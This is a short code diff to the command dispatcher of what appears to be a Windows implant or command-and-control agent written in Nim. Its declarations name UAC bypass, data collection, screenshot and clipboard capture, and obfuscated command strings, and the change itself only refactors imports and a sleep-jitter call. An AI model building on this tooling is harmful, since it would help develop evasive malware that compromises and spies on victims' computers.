@@ -1,5 +1,5 @@
 # Internal imports
-include ../config
+import ../config
 import ../common
 import utils/[audio, clipboard, clr, helpers, memops, misc, screenshot]
 # Internal imports
@@ -36,7 +36,6 @@ proc set_spe(process_name: string, cmd: string): bool
 proc uac_bypass(bypass_method: string, cmd: string, keep_or_die: string): bool
 proc msgbox(title: string, text: string): bool
 proc speak(text: string): bool
-proc change_sleep_time(timeframe: int,  jitter_percent: int): bool
 
 # Helpers
 proc get_windows_agent_id*(): string
@@ -589,7 +588,7 @@ proc windows_parse_command*(command: JsonNode): bool =
         of protectString("speak"):
             is_success = speak(command["text"].getStr())
         of protectString("sleep"):
-            is_success = change_sleep_time(command["timeframe"].getInt(), command[protectString("jitter_percent")].getInt())
+            is_success = change_sleep_time(client, command["timeframe"].getInt(), command[protectString("jitter_percent")].getInt())
         of protectString("collect"):
             is_success = collect_data()
         of protectString("kill"):
